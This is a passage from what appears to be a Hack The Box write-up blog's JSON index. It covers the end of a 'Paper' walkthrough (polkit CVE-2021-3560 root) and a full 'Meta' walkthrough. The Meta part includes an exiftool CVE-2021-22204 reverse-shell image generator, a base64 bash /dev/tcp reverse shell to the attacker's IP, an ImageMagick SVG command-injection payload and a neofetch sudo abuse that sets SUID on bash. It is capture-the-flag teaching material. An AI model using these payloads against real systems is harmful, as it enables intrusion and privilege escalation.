(0x6c75696a616974)[+] Enjoy your root if exploit was completed succesfully[root@paper PwnKit-Exploit]# wc -c /root/root.txt33 /root/root.txtPolkitThe actually intended solution to obtain root on the machine was to abuse polkit. Checking for the installed version we can see that it is vulnerable to CVE-2021-3560.[dwight@paper ~]$ rpm -qa | grep -i polkitpolkit-0.115-6.el8.x86_64polkit-pkla-compat-0.1-12.el8.x86_64polkit-libs-0.115-6.el8.x86_64Using the authors poc script we are able to create a new user with sudo rights and add the root flag to our collection. Note that this exploit is because of its time based nature not completely stable and might need rerunning until it works.[dwight@paper tmp]$ ./poc.sh -u=sm1l3z -p=sm1l3z[!] Username set as : sm1l3z[!] No Custom Timing specified.[!] Timing will be detected Automatically[!] Force flag not set.[!] Vulnerability checking is ENABLED![!] Starting Vulnerability Checks...[!] Checking distribution...[!] Detected Linux distribution as \"centos\"[!] Checking if Accountsservice and Gnome-Control-Center is installed[+] Accounts service and Gnome-Control-Center Installation Found!![!] Checking if polkit version is vulnerable[+] Polkit version appears to be vulnerable!![!] Starting exploit...[!] Inserting Username sm1l3z...Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required[+] Inserted Username sm1l3z  with UID 1006![!] Inserting password hash...[!] It looks like the password insertion was succesful![!] Try to login as the injected user using sudo - sm1l3z[!] When prompted for password, enter your password[!] If the username is inserted, but the login fails; try running the exploit again.[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell![dwight@paper tmp]$ su - sm1l3zPassword:[sm1l3z@paper ~]$ sudo suWe trust you have received the usual lecture from the local SystemAdministrator. It usually boils down to these three things:    #1) Respect the privacy of others.    #2) Think before you type.    #3) With great power comes great responsibility.[sudo] password for sm1l3z:[root@paper sm1l3z]# wc -c /root/root.txt33 /root/root.txt"
  },
  
  {
    "title": "Hack The Box - Meta",
    "url": "/posts/meta/",
    "categories": "HackTheBox",
    "tags": "linux, medium, exfitool, cve, imagemagick, neofetch, sudo",
    "date": "2022-06-11 00:00:00 +0800",
    





    
    "snippet": "Meta is a medium rated machine on HackTheBox created by Nauten. For the user part we will abuse a CVE in exiftool to obtain a reverse shell on the machine. This will be followed up by another CVE i...",
    "content": "Meta is a medium rated machine on HackTheBox created by Nauten. For the user part we will abuse a CVE in exiftool to obtain a reverse shell on the machine. This will be followed up by another CVE inside ImageMagick which will give us a shell as another user. To escalate to root we will modify a config file for neofetch which we are able to run using sudo.UserAs usual we start our enumeration with a nmap scan against all ports followed by a script and version detection scan against the open ones to get an initial overview of the attack surface.NmapAll ports$ sudo nmap -p- -n -T4 10.129.166.252Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 22:40 CETNmap scan report for 10.129.166.252Host is up (0.027s latency).Not shown: 65532 closed tcp ports (reset)PORT      STATE    SERVICE22/tcp    open     ssh80/tcp    open     httpNmap done: 1 IP address (1 host up) scanned in 529.64 secondsScript and version$ sudo nmap -sC -sV -p22,80 -n 10.129.166.252Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 22:52 CETNmap scan report for 10.129.166.252Host is up (0.029s latency).PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)80/tcp open  http    Apache httpd|_http-server-header: Apache|_http-title: Did not follow redirect to http://artcorp.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.73 secondsExfitoolThe nmap scan leaks the hostname artcorp.htb so we add it to our /etc/hosts. Opening the page up in our browser it looks like a completly static webpage without much functionality.Checking for additional vhosts using ffuf we are able to find dev01.artcorp.htb which we also add to our /etc/hosts.$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.artcorp.htb' -u http://10.129.166.252 -fs 0        /'___\\  /'___\\           /'___\\       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\          \\/_/    \\/_/   \\/___/    \\/_/       v1.3.1 Kali Exclusive &lt;3________________________________________________ :: Method           : GET :: URL              : http://10.129.166.252 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header           : Host: FUZZ.artcorp.htb :: Follow redirects : false :: Calibration      : false :: Timeout          : 10 :: Threads          : 40 :: Matcher          : Response status: 200,204,301,302,307,401,403,405 :: Filter           : Response size: 0________________________________________________dev01                   [Status: 200, Size: 247, Words: 16, Lines: 10]Going there we see a development page with only one application available.Clicking on MetaView there is a file upload form which tells us to upload an image to display metadata.Uploading a test jpg the output looks like straight from exiftool.There has been a recent CVE(CVE-2021-22204)with remote code execution in exiftool. Using this PoC where we only have to adjust our ip address to tun0 and the port to where we want to catch the reverse shell we can generate an image that sends a python reverse shell back to our machine.exploit.py#!/bin/env python3import base64import subprocessip = '10.10.14.73'port = '7575'payload = b\"(metadata \\\"\\c${use MIME::Base64;eval(decode_base64('\"payload = payload + base64.b64encode( f\"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}'))));\".encode() )payload = payload + b\"'))};\\\")\"payload_file = open('payload', 'w')payload_file.write(payload.decode('utf-8'))payload_file.close()subprocess.run(['bzz', 'payload', 'payload.bzz'])subprocess.run(['djvumake', 'exploit.djvu', \"INFO=1,1\", 'BGjp=/dev/null', 'ANTz=payload.bzz'])subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif&lt;=exploit.djvu', 'image.jpg'])Running the script the image is getting updated with the payload.$ python3 exploit.py    1 image files updatedNow we just have to set up a listener on the port we specified and upload the generated image to the website.$ nc -lnvp 7575Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::7575Ncat: Listening on 0.0.0.0:7575After we click the upload button the page hangs and we get a connection back on our ncat listener as www-data which we upgrade using python and fix the terminal size.$ nc -lnvp 7575Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::7575Ncat: Listening on 0.0.0.0:7575Ncat: Connection from 10.129.166.252.Ncat: Connection from 10.129.166.252:43968./bin/sh: 0: can't access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@meta:/var/www/dev01.artcorp.htb/metaview$ export TERM=xtermexport TERM=xtermwww-data@meta:/var/www/dev01.artcorp.htb/metaview$ ^Z[1]  + 43617 suspended  nc -lnvp 7575$ stty raw -echo;fg[1]  + 43617 continued  nc -lnvp 7575www-data@meta:/var/www/dev01.artcorp.htb/metaview$ImageMagickTaking a look around on the system and monitoring for running processes there seems to be a cronjob being run by the user thomas who has the uid of 1000.2022/01/22 17:13:01 CMD: UID=0    PID=1441   | /usr/sbin/CRON -f2022/01/22 17:13:01 CMD: UID=1000 PID=1442   | /bin/bash /usr/local/bin/convert_images.sh2022/01/22 17:13:01 CMD: UID=1000 PID=1444   | pkill mogrifyChecking the script it cd‚Äôs into the directory /var/www/dev01.artcorp.htb/convert_images and then calls /usr/local/bin/mogrify on all files machting *.* with an output format of png./usr/local/bin/convert_images.sh#!/bin/bashcd /var/www/dev01.artcorp.htb/convert_images/ &amp;&amp; /usr/local/bin/mogrify -format png *.* 2&gt;/dev/nullpkill mogrifyTaking a closer look at the mogrify it is actually a symlink to magick which is part of ImageMagick.www-data@meta:/var/www/dev01.artcorp.htb/metaview$ ls -la /usr/local/bin/mogrifylrwxrwxrwx 1 root root 6 Aug 29 15:59 /usr/local/bin/mogrify -&gt; magickTo check for possible CVE‚Äôs in ImageMagick we need the version number first.www-data@meta:/var/www/dev01.artcorp.htb/metaview$ mogrify --versionVersion: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.orgCopyright: ¬© 1999-2020 ImageMagick Studio LLCLicense: https://imagemagick.org/script/license.phpFeatures: Cipher DPC HDRI OpenMP(4.5)Delegates (built-in): fontconfig freetype jng jpeg png x xml zlibLooking the version up on google we are able to find a PoC which should work with the installed version of ImageMagick. The PoC abuses the the authentication mechanism for password protected PDF‚Äôs to pass additional shell commands. To abuse this we first we generate a base64 encoded  reverse shell payload.$ echo -n 'bash -c \"bash -i &gt;&amp;/dev/tcp/10.10.14.73/7575 0&gt;&amp;1\"' | base64YmFzaCAtYyAiYmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjczLzc1NzUgMD4mMSI=We then take the poc.svg from the blogpost and exchange the payload with our reverse shell.poc.svg&lt;image authenticate='ff\" `echo -n YmFzaCAtYyAiYmFzaCAtaSA+Ji9kZXYvdGNwLzEwLjEwLjE0LjczLzc1NzUgMD4mMSI= | base64 -d | bash`;\"'&gt;  &lt;read filename=\"pdf:/etc/passwd\"/&gt;  &lt;get width=\"base-width\" height=\"base-height\" /&gt;  &lt;resize geometry=\"400x400\" /&gt;  &lt;write filename=\"test.png\" /&gt;  &lt;svg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"&gt;  &lt;image xlink:href=\"msl:poc.svg\" height=\"100\" width=\"100\"/&gt;  &lt;/svg&gt;&lt;/image&gt;All we have to do now is to set up a ncat listener and to drop the file in the /var/www/dev01.artcorp.htb/convert_images on the target machine.nc -lnvp 7575Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::7575Ncat: Listening on 0.0.0.0:757www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ wget 10.10.14.73/poc.svg -O poc.svg--2022-01-22 17:18:46--  http://10.10.14.73/poc.svgConnecting to 10.10.14.73:80... connected.HTTP request sent, awaiting response... 200 OKLength: 475 [image/svg+xml]Saving to: ‚Äòpoc.svg‚Äôpoc.svg                                                     100%[==========================================================================================================================================&gt;]     475  --.-KB/s    in 0s2022-01-22 17:18:46 (55.3 MB/s) - ‚Äòpoc.svg‚Äô saved [475/475]www-data@meta:/var/www/dev01.artcorp.htb/convert_images$ ls -latotal 12drwxrwxr-x 2 root     www-data 4096 Jan 22 17:18 .drwxr-xr-x 4 root     root     4096 Oct 18 14:27 ..-rw-r--r-- 1 www-data www-data  475 Jan 22 15:08 poc.svgAfter some time we get a connection back as thomas and are able to read the user flag.$ nc -lnvp 7575Ncat: Version 7.92 ( https://nmap.org/ncat )Ncat: Listening on :::7575Ncat: Listening on 0.0.0.0:7575Ncat: Connection from 10.129.166.252.Ncat: Connection from 10.129.166.252:43978.bash: cannot set terminal process group (1533): Inappropriate ioctl for devicebash: no job control in this shellthomas@meta:/var/www/dev01.artcorp.htb/convert_images$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'&lt;ges$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ export TERM=xtermexport TERM=xtermthomas@meta:/var/www/dev01.artcorp.htb/convert_images$ ^Z[1]  + 45412 suspended  nc -lnvp 7575$ stty raw -echo;fg[1]  + 45412 continued  nc -lnvp 7575                                                       ^Cthomas@meta:/var/www/dev01.artcorp.htb/convert_images$ stty rows 57 cols 239thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ wc -c ~/user.txt33 /home/thomas/user.txtRootChecking for sudo permission thomas is able to run /usr/bin/neofetch as the root user. An interesting point here is the env_keep+=XDG_CONFIG_HOME flag for the sudoers entry.env_keep means that this environment variable will not be reset when calling sudo even though env_reset is present aswell.thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ sudo -lMatching Defaults entries for thomas on meta:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOMEUser thomas may run the following commands on meta:    (root) NOPASSWD: /usr/bin/neofetch \\\"\\\"To see what we can do with this we can look for the variable in the source code of neofetch. The variable is used to declare the configuration directory of neovim. The interesting thing here is that the configuration file for neoftech get‚Äôs sourced. This means that anything we put into the configuration file will be eventually executed setting the XDG_CONFIG_HOME./usr/bin/neofetch#!/usr/bin/env bash# vim: noai:ts=4:sw=4:expandtab# shellcheck source=/dev/null# shellcheck disable=2009...[snip]...version=\"6.0.0\"bash_version=\"${BASH_VERSION/.*}\"sys_locale=\"${LANG:-C}\"XDG_CONFIG_HOME=\"${XDG_CONFIG_HOME:-${HOME}/.config}\"PATH=\"${PATH}:/usr/xpg4/bin:/usr/sbin:/sbin:/usr/etc:/usr/libexec\"...[snip]...get_user_config() {    mkdir -p \"${XDG_CONFIG_HOME}/neofetch/\"    # --config /path/to/config.conf    if [[ -f \"$config_file\" ]]; then        source \"$config_file\"        err \"Config: Sourced user config. (${config_file})\"        return    elif [[ -f \"${XDG_CONFIG_HOME}/neofetch/config.conf\" ]]; then        source \"${XDG_CONFIG_HOME}/neofetch/config.conf\"        err \"Config: Sourced user config.    (${XDG_CONFIG_HOME}/neofetch/config.conf)\"    elif [[ -f \"${XDG_CONFIG_HOME}/neofetch/config\" ]]; then        source \"${XDG_CONFIG_HOME}/neofetch/config\"        err \"Config: Sourced user config.    (${XDG_CONFIG_HOME}/neofetch/config)\"    else        config_file=\"${XDG_CONFIG_HOME}/neofetch/config.conf\"        # The config file doesn't exist, create it.        printf '%s\\n' \"$config\" &gt; \"$config_file\"    fi}...[snip]...dynamic_prompt() {    [[ $image_backend == off ]]   &amp;&amp; { printf '\\n'; return; }    [[ $image_backend != ascii ]] &amp;&amp; ((lines=(height + yoffset) / font_height + 1))    [[ $image_backend == w3m ]] &amp;&amp; ((lines=lines + padding / font_height + 1))--    [[ \"$*\" != *--config* ]] &amp;&amp; get_user_config...[snip]...To abuse this we can simply append a command setting the suid bit on bash to the config file, export the XDG_CONFIG_HOME variable and run neofetch with sudo. Finally we can use the -p flag on bash to keep the suid permissions on our modified bash and add the root flag to our collection.thomas@meta:/var/www/dev01.artcorp.htb/convert_images$ echo 'chmod +s /bin/bash' &gt;&gt; /home/thomas/.config/neofetch/config.conf; export XDG_CONFIG_HOME=/home/thomas/.config/; sudo /usr/bin/neofetch; bash -p       _,met$$$$$gg.          root@meta    ,g$$$$$$$$$$$$$$$P.       ---------  ,g$$P\"     \"\"\"Y$$.\".        OS: Debian GNU/Linux 10 (buster) x86_64 ,$$P'              `$$$.     Host: VMware Virtual Platform None',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64`d$$'     ,$P\"'   .    $$$    Uptime: 52 mins $$P      d$'     ,    $$P    Packages: 495 (dpkg) $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 $$;      Y$b._   _,d$P'      CPU: Intel Xeon Gold 5218 (2) @ 2.294GHz Y$$.    `.`\"Y$$$$P\"'         GPU: VMware SVGA II Adapter `$$b      \"-.__              Memory: 154MiB / 1994MiB  `Y$$   `Y$$.     `$$b.       `Y$$b.          `\"Y$b._              `\"\"\"bash-5.0# iduid=1000(thomas) gid=1000(thomas) euid=0(root) egid=0(root) groups=0(root),1000(thomas)bash-5.0# wc -c /root/root.txt33 /root/root.txt"
  }
  
]

